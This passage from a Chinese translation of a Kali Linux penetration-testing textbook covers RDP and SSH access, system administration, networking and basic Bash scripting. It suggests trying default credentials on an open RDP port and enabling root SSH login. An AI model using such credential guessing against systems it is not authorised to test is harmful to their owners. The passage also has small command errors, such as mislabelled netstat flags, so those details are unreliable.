  \ file_uniq.txt\n5\n6\n4\n```\n\n\n\n\n\n远程连接到其他操作系统的常用方法有两种。对于 Windows，使用的是远程桌面协议（`RDP`）；对于\
  \ Linux，使用的是安全外壳（`SSH`）。在接下来的章节中，我将解释如何使用每种协议远程连接到操作系统（Windows 或 Linux）。\n\n## 远程桌面协议\n\
  \n`RDP` 用于远程连接到 Windows 操作系统。假设在执行任务期间，你在 Windows 宿主机上遇到了一个开放的远程桌面端口 `3389`（例如在端口扫描阶段）。这时，你将尝试使用一些基本凭据进行连接（例如，用户名为\
  \ `Administrator`，密码为 `password123`）。在执行任务的过程中，有很多时候你希望从 Kali Linux 远程连接到 Windows\
  \ 系统以完成工作。在这种情况下，你将需要使用 `rdesktop` 命令。\n\n```\n $rdesktop [Windows 宿主机 IP 地址] -u\
  \ [Windows 中的用户名] -p [Windows 中的密码]\n```\n\n你也可以省略密码，并在稍后输入。请参见图 1.9 中的示例。\n\n![Windows\
  \ 登录快照。](img/c01f009.png)\n\n图 1.9 “Windows 登录”\n\n## 安全外壳\n\n`SSH` 协议是一种安全连接，允许你在\
  \ Linux 宿主机（在此情况下为 Kali）上远程执行命令。默认情况下，`SSH` 是工作在端口 `22` 的 TCP 协议。连接到远程 `SSH` 服务器有两种方法：\n\
  \n*   使用用户名/密码凭据\n*   使用公/私钥（无密码）\n\n### 使用凭据的 SSH\n\n我们先从使用密码的方法开始。默认情况下，除 root\
  \ 账户外所有用户账户都可以远程登录 `SSH`：\n\n```\n $ssh username@kaliIP\n```\n\n图 1.10 显示了一个不允许远程登录\
  \ Kali Linux 的 root 用户，以及一个能够使用 `SSH` 远程登录的普通用户（`kali`）。在图 1.10 中，我正在 Windows 操作系统上使用\
  \ MobaXterm 通过 `SSH` 远程连接到 Kali 虚拟机。\n\n![Windows 上使用 MobaXterm 使用 SSH 的快照。](img/c01f010.png)\n\
  \n图 1.10 Windows 上带有 MobaXterm 的 SSH\n\n要允许 root 用户远程登录 `SSH`，你需要编辑此目录下的 `SSH` 配置文件：\n\
  \n```\n /etc/ssh/sshd_config\n```\n\n确保在 `SSH` 配置文件中添加以下行：\n\n```\n PermitRootLogin\
  \ Yes\n```\n\n现在，我们可以尝试使用 root 账户远程连接到我们的 Kali 宿主机（在进行最新更改后这次应该可以了）：\n\n![SSH root\
  \ 连接快照。](img/c01f011.png)\n\n图 1.11 SSH root 连接\n\n在你的 Kali Linux 上使用 `SSH` 服务之前，你需要先启动\
  \ `SSH` 服务。要做到这一点，你需要执行以下命令：\n\n```\n $service ssh start\n```\n\n如果你以后想停止它，请使用以下命令：\n\
  \n```\n $service ssh stop\n```\n\n如果你希望 `SSH` 服务器在重启系统后仍然存在（自动启动），则你需要执行以下命令：\n\n\
  ```\n $systemctl enable ssh\n```\n\n如果你忘记了 `SSH` 服务器的状态（已启动或停止），请执行以下命令以获取图 1.12\
  \ 中所示的结果：\n\n```\n $service ssh status\n```\n\n![SSH 服务状态快照。](img/c01f012.png)\n\
  \n图 1.12 SSH 服务状态\n\n默认情况下，`SSH` 的端口号为 `22`，如果远程 Linux 服务器已更改为其他端口，则你需要在连接命令中指定它：\n\
  \n```\n $ssh username@kaliIP -p [端口号]\n```\n\n### 无密码 SSH\n\n使用公钥和私钥，远程用户可以使用 `SSH`\
  \ 登录。这种方法比密码方式更安全，因为没有人能使用暴力破解技术远程进入你的服务器。\n\n关于公/私钥机制，存在很多误解。在接下来的步骤中，我从零开始开发了一个示例，让你直观看到现实中发生的情况：\n\
  \n这里是客户端机器的信息：\n\n*   OS：Ubuntu Desktop Linux V20\n*   IP:10.0.0.186\n\n这里是 Kali\
  \ Linux SSH 服务器主机的信息：\n\n*   OS：Kali Linux 2020.1\n*   IP:10.0.0.246\n\n首先，我们将在客户端宿主机（Ubuntu）上生成公钥和私钥。为什么？目标是执行以下步骤：\n\
  \n1.  在客户端上生成私钥（`/home/[username]/.ssh/id_rsa`）。如果有人偷了你的私钥，他们就可以进入。\n2.  在客户端上生成公钥（`/home/[username]/.ssh/id_rsa.pub`）。之后，服务器会将公钥存储在\
  \ `authorized_keys` 文件中。\n\n让我们开始！图 1.13：\n\n```\n sshkeygen -t rsa -b 4096\n```\n\
  \n上面的命令使用了两个参数：\n\n*   `-t rsa`：密钥类型。`RSA` 是最常用的，但你还有其他选项如 `dsa`、`ecdsa`、`ed25519`。\n\
  *   `-b 4096`：位数。在我们的情况下是 `4096`，默认是 `3072`。\n\n注意，在执行前面的步骤时，会被要求输入密码语。这个密码将在登录时增加安全性。\n\
  \n![SSH 生成快照。](img/c01f009.png)\n\n图 1.13 检查客户端上保存这些文件的文件夹：\n\n```\n ~/.ssh$ ls\
  \ -la\ntotal 16\ndrwx------ 2 gus 4096 10:03 .\ndrwxr-xr-x 15 gus 4096 09:57 ..\n\
  -rw------- 1 gus 3369 10:03 id_rsa\n-rw-r--r-- 1 gus 736 10:03 id_rsa.pub\n```\n\
  \n现在我们准备好将公钥 `id_rsa.pub` 发送到 Kali 主机。你可以通过多种方式发送（例如，通过电子邮件、SFTP、SCP）。\n\n使用 SSH\
  \ 工具自带的 SSH 包有一个简单安全的方法：\n\n```\n $ssh-copy-id username_on_kalihost@kaliIP\n```\n\
  \n在示例中，我们将使用 root 用户名和密码（同样，你会被要求输入此账户的密码）来复制公钥：\n\n```\n gus@ubuntu:$$ ssh-copy-id\
  \ root@10.0.0.246\nThe authenticity of host '10.0.0.246 (10.0.0.246)' can't be established.\n\
  RSA key fingerprint is SHA256:TA8zjlhAspZEc/3WZjyWRQBxzPfwJXE2X98JsMG6U.\nAre you\
  \ sure you want to continue connecting (yes/no/[fingerprint])? yes\n/usr/bin/ssh-copy-id:\
  \ INFO: attempting to log in with the new key(s), to filter out any that are already\
  \ installed\n/usr/bin/ssh-copy-id: INFO: 1 key(s) remain to be installed -- if you\
  \ are prompted now it is to install the new keys\nPassword:\n\nNumber of key(s)\
  \ added: 1\n```\n\n现在尝试登录机器：`ssh 'root@10.0.0.246'`，并检查只添加了你想要的密钥。\n\n现在，让我们验证授权密钥是否真的已添加到\
  \ Kali 主机上：\n\n\n\n\n\n```\nroot@kali:~/.ssh# cat authorized_keys \nssh-rsa \
  \ gus@ubuntu\n```\n\n接下来，我将在 Kali 上再次编辑 SSH 配置文件（`/etc/ssh/sshd_config`），以允许仅使用公钥认证：\n\
  \n```\nPubkeyAuthentication yes\nPasswordAuthentication no\n```\n\n现在是时候测试 SSH 连接并查看远程是否有效了：\n\
  \n```\ngus@ubuntu:~/.ssh$ ssh root@10.0.0.246\nLinux kali 5.5.0-kali1-amd64 #1 SMP\
  \ Debian 5.5.13-2kali1 (2020-04-03) x86_64\n\nThe programs included with the Kali\
  \ GNU/Linux system are free software;\nthe exact distribution terms for each program\
  \ are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nKali\
  \ GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable\
  \ law.\nLast login: Thu Oct 1 12:04:15 2020 from 10.0.0.222\nroot@kali:~#\n```\n\
  \n# Kali Linux 系统管理\n\n由于你将使用 Kali Linux 作为渗透测试工具库，因此你必须知道如何处理它的系统，包括如何启动 Apache\
  \ Web 服务器或检查其状态。示例是无尽的。别担心，稍后我们将介绍你作为渗透测试员可能会遇到的常见场景。\n\n![Kali 系统管理命令截图](img/c01f014.png)\n\
  \n图 1.14 Kali 系统管理命令\n\n## Linux 主机信息\n\n要显示 Kali Linux 的主机名，你只需在终端中执行 `hostname`\
  \ 命令：\n\n```\n$hostname\n\nroot@kali:/# hostname\n```\n\n如果你想更改 Kali 的主机名怎么办？你需要编辑其配置文件\
  \ `/etc/hostname`（输入所需的名称并忘记重启主机）。\n\n## Linux 操作系统\n\n了解 Linux 主机的操作系统信息对于权限提升至关重要。这就是你了解版本是否易受攻击的方法（我们将在第\
  \ 10 章 中讨论这个话题）。要显示 Linux 操作系统的信息（在本例中为 Kali Linux），我使用 `uname` 命令并配合 `/etc/issue`\
  \ 文件的内容：\n\n```\n$uname -a\n$cat /etc/issue\n\nroot@kali:/# uname -a\nLinux 5.5.0-kali1-amd64\
  \ #1 SMP Debian 5.5.13-2kali1 (2020-04-03) x86_64 GNU/Linux\nroot@kali:/# \n```\n\
  \n## Linux 硬件信息\n\n你可能会经常使用与 PC 或虚拟机硬件相关的特殊命令。要获取 Linux 主机的 CPU 信息，你需要打开 `/proc/cpuinfo`：\n\
  \n```\nroot@kali:/# cat /proc/cpuinfo\nprocessor: 0\nvendor_id: GenuineIntel\ncpu\
  \ family: 6\nmodel: 158\nmodel name: Intel(R) Core(TM) i7-8700 @3.20GHz\nstepping:\
  \ 10\nmicrocode: 0xd6\ncpu MHz: 3192.0\ncache size: 12288 KB\n```\n\n要获取 Kali 主机的\
  \ RAM 信息，你需要打开配置文件 `/proc/meminfo`：\n\n```\nroot@kali:/# cat /proc/meminfo\nMemTotal:\
  \        8676820 kB\nMemFree:         6183876 kB\nMemAvailable:    7781928 kB\n\
  Buffers:           5544 kB\nCached:          1739668 kB\nSwap:            0 kB\n\
  ```\n\n要显示连接设备（例如磁盘驱动器、分区等），你有两个选择：`fdisk`（显示更多信息）或 `lsblk`：\n\n```\n$fdisk -l\n\
  \nroot@kali:/# fdisk -l\nDisk /dev/sda: 80 GiB, 85899345920 bytes, 16777216 sectors\n\
  Disk model: Virtual Disk\nUnits: sectors of 512 bytes\nSector size (logical/physical):\
  \ 512 bytes\nI/O size (minimum/optimal): 512 bytes\nDisk label: dos\nDisk identifier:\
  \ 0x4a6f3195\nDevice     Boot       End   Sectors Size Type\ndev/sda1         2048\
  \ 163579903 1677856  78G Linux\ndev/sda2      163581950 167770111 4188162   2G Extended\n\
  dev/sda5      163581952 167770111 4188160   2G swap\n\n$lsblk\n\nroot@kali:/# lsblk\n\
  NAME         MAJ:MIN SIZE RO MOUNTPOINT\nsda            8:0    80G  0 disk \nsda1\
  \    8:1    78G  0 part \nsda2    8:2     1K  0 part \nsda5    8:5    2G  0 part\
  \ [SWAP]\nsr0           11:0    1024M 0 rom\n```\n\n显示 USB 设备列表（例如鼠标、USB 盘等），你必须执行\
  \ `lsusb` 命令：\n\n```\n$lsusb\n\nroot@kali:/# lsusb\nBus 001 Device 001: ID 1d6b:0002\
  \ Linux Foundation 2.0 root hub\nBus 002 Device 004: ID 0e0f:0008 VMware, Inc. Virtual\
  \ USB Mouse\nBus 002 Device 003: ID 0e0f:0002 VMware, Inc. Virtual USB Hub\nBus\
  \ 002 Device 002: ID 0e0f:0003 VMware, Inc. Virtual Mouse\nBus 002 Device 001: ID\
  \ 1d6b:0001 Linux Foundation 1.1 root hub\n```\n\n要显示挂载到文件系统中的所有目录，你需要执行 `mount`\
  \ 命令：\n\n```\n$mount\n\nroot@kali:/# mount\nsysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)\n\
  proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)\nudev on /dev type devtmpfs\
  \ (rw,nosuid,noexec,relatime,size=4308020k,nr_inodes=107705,mode=755)\n```\n\n##\
  \ 管理运行中的服务\n\n服务是可以运行在你的 Kali Linux 上的服务器，例如 SSH、Web 等。\n\n渗透测试中的常见任务之一是在 Kali 上运行\
  \ Web 服务器（在获取远程 Shell 后，我将在本书中详细介绍）。例如，在 Kali 上启动服务：\n\n```\nroot@kali:/# service\
  \ apache2 start \n```\n\n以下是你需要了解服务的服务的命令：\n\n- 获取服务的状态（已启动、停止）：\n  - `$service\
  \ [service name] status`\n  - `$systemctl status [service name]`\n- 启动服务：\n  - `$service\
  \ [service name] start`\n  - `$systemctl start [service name]`\n- 停止服务：\n  - `$service\
  \ [service name] stop`\n  - `$systemctl stop [service name]`\n- 重启服务：\n  - `$service\
  \ [service name] restart`\n  - `$systemctl restart [service name]`\n- 设置服务开机自动启动：\n\
  \  - `$systemctl enable [service name]`\n- 禁止服务开机自动启动：\n  - `$systemctl disable\
  \ [service name]`\n\n\n\n\n我们在 `upgrade` 命令中使用 `-y` 选项来忽略要求输入的提示信息。换句话说，我们只是提前预设了“是”。\n\
  \n`upgrade` 和 `update` 命令之间有什么区别呢？这是一个让初学者感到困惑的问题，我在这里是为了帮助你从容地开始使用这两个命令。总而言之，`update`\
  \ 命令仅更新包含最新版本的软件包列表，但它不会安装或升级软件包。另一方面，`upgrade` 命令将升级并安装已安装软件包（通过 `update` 命令获取）的最新版本。\n\
  \n现在，为了结合使用这些命令，你需要在它们之间使用 `&&`，它最终会运行第一个命令，并在完成后运行第二个：\n\n```\n $apt update &&\
  \ apt upgrade -y\n```\n\n要从一个版本完全升级到另一个版本，请执行 `full-upgrade` 命令以及 `update` 命令。\n\
  \n```\n $apt update && apt full-upgrade -y\n```\n\n现在，要列出 Kali Linux 上所有已安装的软件包，你需要使用\
  \ `dpkg` 命令：\n\n```\n $dpkg -l\n```\n\n在 Kali 上安装新软件（软件包）该怎么办？我有两种最常用的方法。第一种是 `apt\
  \ install` 命令，第二种是 `dpkg`（我只有在下载以 `.deb` 结尾的文件时才使用后者）。\n\n```\n $apt install [package\
  \ name] -y\n$dpkg -i [filename.deb]\n```\n\n在某些软件包中，它们要求你使用 `configure` / `make`\
  \ 这种方式，如果是这种情况，请使用以下命令（你必须进入应用程序目录）：\n\n```\n $./configure && make && make install\n\
  ```\n\n如果你想从 Kali 系统中删除一个现有的应用程序，可以使用 `apt remove` 命令：\n\n```\n $apt remove [package\
  \ name]\n```\n\n我们如何找到软件包名称呢？假设你想安装一些 Kali 上尚未安装的东西。那么你可以使用以下命令搜索仓库中的软件包：\n\n```\n\
  \ $apt-cache search keyword\n```\n\n最后，如果你想安装一个软件包，但不确定该名称是否存在于仓库中，那么你可以使用使用 `apt-cache\
  \ show` 命令：\n\n```\n $apt-cache show [software name]\n\nroot@kali:/# apt-cache show\
  \ filezilla\nPackage: filezilla\nVersion: 3.49.1-1\nInstalled-Size: 6997\nMaintainer:\
  \ Adrien Cunin <adri2000@ubuntu.com>\nArchitecture: amd64\n[…] \n```\n\n## 进程管理\n\
  \n我最喜欢的列出 Kali 上所有运行进程的终端工具之一是 `htop`。默认情况下，Kali 上没有安装，因此为了安装它，我们使用 `apt install`\
  \ 命令：\n\n```\n root@kali:/# apt install htop -y\nReading package lists… Done\nBuilding\
  \ dependency tree \nReading state information… Done\n```\n\n安装完成后，你就可以运行 `htop`\
  \ 命令：\n\n```\n $htop\n```\n\n如你在图 1.15 中所示，我们在另一个窗口中运行 `htop`，它的进程 ID (PID) 等于 1338。\n\
  \n![Snapshot of HTOP.](img/c01f015.png) Figure 1.15\n\n获取当前运行进程列表的另一种方法是使用 `ps`\
  \ 命令：\n\n```\n $ps -Au\n -A: 选择所有进程（如果你只想列出属于当前用户的进程，请使用 -x）\n -u: 显示比默认更多的信息（例如，CPU、MEM）\n\
  ```\n\n要杀死一个进程，你首先需要识别它的 PID；然后你可以使用 `kill` 命令完成任务：\n\n```\n $kill [PID]\n```\n\n\
  如果系统不允许你杀死它，那么你必须使用 `-9` 切换强制杀死它：\n\n```\n $kill -9 [PID]\n```\n\n## Kali 中的网络\n\
  \n在本节中，你将学习 Kali 网络的基础知识。在书的后后部分，我们将回到有关网络更高级的话题，因此请确保理解本节的内容。\n\n![Snapshot of\
  \ Kali Networking Commands.](img/c01f016.png) 图 16\n\n### 网络接口\n\n要在渗透测试中生存，你必须成为网络专家。如果你打算执行网络测试，这是该工作的支柱之一。PC\
  \ 主机具有内部 IP 地址以连接网络，并拥有公网 IP 地址以与外部世界通信。后者是你的路由器的任务，你不需要在本地管理它。另一方面，你必须维护内部 IP 地址，这些地址是静态的（由你定义）或由\
  \ DHCP 服务器自动分配的（通常是你的路由器）。\n\n### IPv4 私有范围\n\nIPv4 的内部 IP 地址（又名私有地址）有多个范围：A、B 和\
  \ C。\n\n- A 类：`10.0.0.0` 到 `10.255.255.255` 或 `10.0.0.0/8`（最多 16,777,214 个主机）\n\
  - B 类：`172.16.0.0` 到 `172.31.255.255`\n- C 类：`192.168.0.0` 到 `192.168.255.255`\n\
  \n\n\n\n![测试互联网连接截图](img/c01f019.png)\n\n图 1.19 测试互联网连接\n\n请注意，我们正在使用 `10.0.0.0`\
  \ 网络作为我们的主 VLAN（虚拟网络）。事实上，我们的家庭网络中有多个 VLAN。例如，我们为 IoT 设备设置了一个 VLAN，但为什么要这样做呢？因为我们希望\
  \ IoT 设备运行在一个独立的网络（`10.0.50.0/24`）上，而不干扰我的主生产主机。\n\n另一个例子是访客 VLAN。这个网络是供连接到无线访客接入点的人使用的，他们将被分配在\
  \ `10.0.20.0`范围内。\n\n公司也采用同样的理念。理想情况下，它们的开发环境与生产环境网络 VLAN 是不同的。\n\n### DNS\n\n域名系统（`DNS`）将域名转换为\
  \ IP 地址。例如，你不需要输入 `https://172.217.13.132`，只需要输入 [`google.com`](https://google.com)。问题是，我是如何得到\
  \ IP 地址的？在你的终端窗口中使用 `host` 命令：\n\n```\n $host [domain name]\n\nroot@kali:/# host\
  \ google.com\ngoogle.com has address 172.217.13.174\ngoogle.com has IPv6 address\
  \ 2607:f8b0:4020:806::200e\ngoogle.com mail is handled by 40 alt3.aspmx.l.google.com.\n\
  google.com mail is handled by 30 alt2.aspmx.l.google.com.\ngoogle.com mail is handled\
  \ by 10 aspmx.l.google.com.\ngoogle.com mail is handled by 50 alt4.aspmx.l.google.com.\n\
  google.com mail is handled by 20 alt1.aspmx.l.google.com.\n```\n\n`DNS` 分为两类：公共和私有（就像\
  \ IP 地址一样）。Google 的 `DNS` 地址是公开的，因此任何连接到互联网的人都可以访问 Google 网站。\n\n另一方面，我们可以为本地内网设置私有\
  \ `DNS`。这可以使用 DNS 服务器（例如 Microsoft Windows Server）或如果你的路由器内置了 DNS 服务器来设置。在我的家庭网络中，我定义了一个名为\
  \ `ksec.local` 的域名。网络上的每个主机都将有一个与其 IP 地址对应的域名。例如，我的文件服务器域名是 `ds-server.ksec.local`（因为服务器主机名是\
  \ `ds-server`），而路由器/DNS 服务器将管理所有的 `DNS` A 记录（A 记录是 IPv4 地址与域名之间的映射）：\n\n```\n root@kali:~#\
  \ host ds-server.ksec.local\nds-server.ksec.local has address 10.0.0.177\n```\n\n\
  如果你指定了一个不存在的 `DNS` 记录，你将收到错误消息（这对于暴力破解 `DNS` 记录很有用）：\n\n```\n root@kali:~# host\
  \ hello.ksec.local\nHost hello.ksec.local not found: 3(NXDOMAIN)\n```\n\n请注意，你可以在\
  \ Kali 主机内部添加自己的静态 `DNS` 记录。该文件位于 `/etc/hosts`，在这里你可以将任何域名重定向到任何活跃 IP 地址。（这就是 `DNS`\
  \ 毒持的工作原理；黑客将操纵 A 记录指向他的服务器 IP 地址。）\n\n```\n root@kali:~# cat /etc/hosts\n127.0.0.1\
  \       localhost\n127.0.1.1       kali\n\n## 以下几行对于支持 IPv6 的主机是必要的\n::1     localhost\
  \ ip6-localhost ip6-loopback\nff02::1 ip6-allnodes\nff02::2 ip6-allrouters\n```\n\
  \n你将在书中后面学习更多关于这个主题的内容，并将 `DNS` 暴力破解和区域传输是如何工作的。\n\n### 已建立连接\n\n要显示 Kali 主机上的活动网络连接，你必须使用\
  \ `netstat` 工具来完成。你将在后渗透阶段使用此命令来检查 Linux 主机如何与其网络通信。\n\n在我们的 Kali 主机上，我们启动了 SSH（端口\
  \ 22）和 Web（端口 80）服务；`netstat` 工具允许我们看到它们正在监听入站连接：\n\n```\n root@kali:~# netstat\
  \ -antu\nActive Internet connections (servers and established)\nProto Recv-Q Send-Q\
  \ Local Address       Foreign Address   State \ntcp        0      0 0.0.0.0:22 \
  \         0.0.0.0:*         LISTEN \ntcp6       0      0 :::80               :::*\
  \              LISTEN \ntcp6       0      0 :::22               :::*           \
  \   LISTEN \nudp        0      0 10.0.0.185:68       10.0.0.1:67       ESTABLISHED\n\
  ```\n\n理解每个选项的含义至关重要：\n\n- `-a/-all`：显示所有套接字。注意此选项非常详细；因此，我们需要结合以下选项使用（以过滤输出）。\n\
  - `-n/-numeric`：不解析名称。\n- `-u/-tcp`：显示 TCP 套接字。\n- `-udp`：显示 UDP 套接字。\n\n### 文件传输\n\
  \n有很多传输文件的方法。在本章中，我们将关注两个常用工具：`wget` 和 `curl`。它们都用于从服务器下载文件。\n\n#### wget\n\n`wget`\
  \ 是一个从 Web 获取内容的命令行工具，简单易用。下载文件使用以下语法：\n\n```\nwget [URL]\n```\n\n#### curl\n\n\
  `curl` 是另一个从 Web 传输数据的工具。它比 `wget` 更强大并支持许多协议。下载文件使用以下语法：\n\n```bash\ncurl -O [URL]\n\
  ```\n\n\n\n\n你的角色重点是渗透测试，而本章的目标是让你能够轻松地处理 Kali Linux 系统。本章介绍了你在执行任务期间会遇到的必要工具和命令。归根底，你并不是\
  \ Linux 系统管理员，但在网络安全领域，你需要跳出框架思考。\n\n# 第 2 章\n\n## Bash 脚本编写\n\n在上一章中，你学习了 Linux\
  \ 中的许多命令。现在，让我们在命令行工具方面将技能提升到下一个水平。在本章中，你将看到如何根据目前所学的知识，使用 Bash 创建脚本命令。\n\n为什么要用\
  \ Bash 脚本？Bash 的通用性为我们这些渗透测试人员提供了执行强大终端命令的灵活性，而无需安装编译器或集成开发环境（IDE）。开发一个 Bash 脚本，你只需要一个文本编辑器就可以开始了。\n\
  \n什么时候应该使用 Bash 脚本？这是在开始本章之前需要解决的重要问题！Bash 并不是为了开发复杂的工具。如果你想这样做，应该使用 Python（Python\
  \ 基础知识将在本书的后部分介绍）。Bash 用于编写在你想要节省时间时实现的快速、小型工具（例如，为了避免重复执行相同的命令，你只需将它们写在 Bash 脚本中）。\n\
  \n本章不仅将教你 Bash 脚本语言，还将更进一步向你展示编程思想。如果你是编程初学者，这将是一个很好的起点，可以帮助你理解编程语言是如何工作的（它们有很多相似之处）。\n\
  \n以下是你将在本章中学习到的内容：\n\n*   使用 Bash 打印到屏幕\n*   使用变量\n*   使用脚本参数\n*   处理用户输入\n*   创建函数\n\
  *   使用条件 `if` 语句\n*   使用 `while` 和 `for` 循环\n\n## 基础 Bash 脚本\n\n图 2.1 总结了所有命令，你可以将其作为参考来掌握本章的所有内容。简之，基础\
  \ Bash 脚本分为以下几类：\n\n*   变量\n*   函数\n*   用户输入\n*   脚本输出\n*   参数\n\n## 在 Bash 中打印到屏幕\n\
  \n使用 Bash 脚本向终端命令行输出内容有两种常见方法。第一种简单的方法是使用我们在上一章中看到的 `echo` 命令（我们在单引号或双引号内包含文本值）：\n\
  \n```bash\necho 'message to print.'\n```\n\n第二种方法是 `printf` 命令；此命令比 `echo` 命令更灵活，因为它允许你格式化想要打印的字符串：\n\
  \n```bash\nprintf 'message to print'\n```\n\n上面的公式太简单了；事实上，`printf` 还允许你格式化字符串（不仅仅是为了打印；远不止于）。让我们来看一个例子：如果我们想显示网络中活动主机的数量，可以使用以下模式：\n\
  \n```bash\nroot@kali:~# printf \"%s %d\\n\" \"Number of live hosts:\" 15\nNumber\
  \ of live hosts: 15\n```\n\n![Bash 脚本截图。](img/c02f001.png)\n\n图 2.1 Bash 脚本\n\n\
  让我们拆分命令，以便你理解正在发生什么：\n\n*   `%s` ：意味着我们在这个位置插入一个字符串（文本）\n*   `%d` ：意味着我们在这个位置添加一个十进制数（数字）\n\
  *   `\\n` ：意味着在打印完成后我们要到新行\n\n此外，请注意我们使用的是双引号而不是单引号。双引号允许我们在字符串处理上比单引号更灵活。因此，大多数时候，我们可以为\
  \ `printf` 使用双引号（我们很少需要使用单引号）。\n\n要使用 `printf` 命令格式化字符串，你可以使用以下模式：\n\n*   `%s` ：字符串（文本）\n\
  *   `%d` ：十进制数（数字）\n*   `%f` ：浮点数（包括带符号数字）\n*   `%x` ：十六进制\n*   `\\n` ：换行\n*   `\\\
  r` ：回车\n*   `\\t` ：水平表符\n\n## 变量\n\n什么是变量，为什么每种编程语言都使用它？\n\n将变量考虑为一个存储区域，你可以在其中保存字符串和数字等内容。目标是在程序中反复使用它们，这个概念适用于任何编程语言（而不只是\
  \ Bash 脚本）。\n\n要声明一个变量，你需要给它一个名称和一个值（值默认为字符串）。变量名只能包含字母或下划线（其他编程语言使用不同的命名约定）。例如，如果你想在变量中存储路由器的\
  \ IP 地址，首先将创建一个文件 `var.sh`（Bash 脚本文件以 `.sh` 结尾），然后在文件内部输入以下内容：\n\n```bash\n#!/bin/bash\n\
  #带有变量的简单程序\n\nROUTERIP=\"10.0.0.1\"\n\nprintf \"The router IP address: $ROUTERIP\\\
  n\"\n```\n\n让我们解释一下你的第一个 Bash 脚本文件：\n\n*   `#!/bin/bash` 被称为 Bash shebang（解释器）；\n\
  *   `ROUTERIP=\"10.0.0.1\"` 是变量声明；\n*   `printf \"The router IP address: $ROUTERIP\\\
  n\"` 输出变量。\n\n\n\n有时候，你可能需要为 Bash 脚本提供参数。你必须用空格来分隔每个参数，然后就可以在 Bash 脚本内部对这些参数进行操作。让我们创建一个简单的加法器（`simpleadd.sh`）来两个两个数字：\n\
  \n```bash\n#!//bin/bash\n### 两个数字的简单加法器\n\n### 将第一个参数存储在 num1 变量中\nNUM1=$1\n###\
  \ 将第二个参数存储在 num2 变量中\nNUM2=$2\n### 将相加结果存储在 total 变量中\nTOTAL=$(($NUM1 + $NUM2))\n\
  \necho '########################'\nprintf \"%s %d\\n\" \"The total is =\" $TOTAL\n\
  echo '########################'\n```\n\n从前面的脚本可以看出，我们使用 `$1` 语法访问第一个参数，使用 `$2` 访问第二个参数（你可以根据需要添加任意数量的参数）。\n\
  \n让我们使用新脚本文件将两个数字相加（注意，从现在起我将脚本存储在 `/opt` 文件夹中）：\n\n```bash\nroot@kali:/opt# simpleadd.sh\
  \ 5 2\n########################\nThe total is = 7\n########################\n```\n\
  \n之前的脚本有一个局限性；它只能加两个数字。如果你想灵活地相加两个到五个数字怎么办？在这种情况下，我们可以使用默认参数功能。换句话说，默认情况下，所有参数值都设置为零，当脚本提供真实值时，我们再将其相加：\n\
  \n```bash\n#!//bin/bash\n### 直到加 5 个数字的简单加法器\n\n### 将第一个参数存储在 num1 变量中\nNUM1=${1:-0}\n\
  ### 将第二个参数存储在 num2 变量中\nNUM2=${2:-0}\n### 将第三个参数存储在 num3 变量中\nNUM3=${3:-0}\n###\
  \ 将第四个参数存储在 num4 变量中\nNUM4=${4:-0}\n### 将第五个参数存储在 num5 变量中\nNUM5=${5:-0}\n### 将相加结果存储在\
  \ total 变量中\nTOTAL=$(($NUM1 + $NUM2 + $NUM3 + $NUM4 + $NUM5))\n\necho '########################'\n\
  printf \"%s %d\\n\" \"The total is =\" $TOTAL\necho '########################'\n\
  ```\n\n为了理解它是如何工作的，让我们以 `NUM1` 变量为例（相同的概念适用于这五个变量）。我们将告诉它从终端窗口读取第一个参数 `{1`，如果用户没有提供，则将其设置为零，如\
  \ `:‐0}` 所示。\n\n使用默认变量，我们不再局限于相加五个数字；从现在起，我们可以添加任意数量的数字，但最大是五个（在接下来的示例中，我们将添加三个数字）：\n\
  \n```bash\nroot@kali:~# simpleadd.sh 2 4 4\n########################\nThe total\
  \ is = 10\n########################\n```\n\n## 用户输入\n\n另一种与 shell 脚本提供的输入交互的方法是使用\
  \ `read` 函数。同样，最好的解释方法是通过示例。我们将要求用户输入他们的名和姓，之后我们将在屏幕上打印全名：\n\n```bash\n#!//bin/bash\n\
  \nread -p \"Please enter your first name:\" FIRSTNAME\nread -p \"Please enter your\
  \ last name:\" LASTNAME\n\nprintf \"Your full name is: $FIRSTNAME $LASTNAME\\n\"\
  \n```\n\n要执行它，我们只需要输入脚本名称（我们不需要像以前那样提供任何参数）。一旦我们输入脚本名称，系统将提示之前脚本中定义的消息：\n\n```bash\n\
  root@kali:~# nameprint.sh\nPlease enter your first name:Gus\nPlease enter your last\
  \ name:Khawaja\nYour full name is: Gus Khawaja\n```\n\n## 函数\n\n函数是将你的 Bash 脚本组织成逻辑部分的方法，而不是拥有无组织的结构（程序员称之为*意大利面代码*）。让我们取之前的加法器程序并对其进行重新组织（重构），以使其看起来更美观。\n\
  \n这个 Bash 脚本（位于图 2.3）被分为三个部分：\n\n*   在第一部分，我们创建了所有的全局变量。全局变量在你创建的任何函数内部都是可访问的。例如，我们能够在\
  \ `add` 函数内部使用示例声明的所有 `NUM` 变量。\n*   接下来，我们通过将应用程序划分为逻辑部分来构建函数。`print_custom()`\
  \ 函数将打印我们给它的任何文本。我们使用 `$1` 来访问传递给此函数的参数值（该值是字符串 `CALCULATOR`）。\n*   最后，我们按顺序调用每个函数（每个函数通过其名称调用）。打印头部，相加数字，最后打印结果。\n\
  \n![Snapshot of Script Sections.](img/c02f003.png)\n\nFigure 2.3 脚本部分\n\n## 条件和循环\n\
  \n现在你已经知道了 Bash 脚本的基础知识，我们可以引入更高级的技术。当你在大多数编程语言（例如，PHP, Python, C, C++, C#, 等）中开发程序时，包括\
  \ Bash 脚本，你将会遇到条件（`if` 语句）和循环，如图 2.4 所示。\n\n![Snapshot of Conditions & Loops.](img/c02f003.png)\n\
  \nFigure 2.4 条件和循环\n\n\n\n注意 `while` 循环中的条件（ `[[ $COUNTER ‐lt 11]]` ）遵循与 `if` 语句相同的规则。由于我们希望计数器在\
  \ 10 时停止，我们将使用以下数学公式：`counter<11`。每当计数器增加时，它都会显示进度。为了让这个程序更有趣，让它在进入下一个数字之前休一秒。\n\
  \n另一方面，`for` 循环采用以下模式：\n\n```\nfor … in [List of items]\ndo\nsomething\ndone\n```\n\
  \n我们将使用之前的相同示例，但用 `for` 循环来运行它。你会发现 `for` 循环在实现上比 `while` 循环更灵活。（诚实地说，我很少使用 `while`\
  \ 循环。）此外，你不需要手动增加索引计数器；它会自动为你完成：\n\n```bash\n#!//bin/bash\n### 使用 For Loop 实现进度条\n\
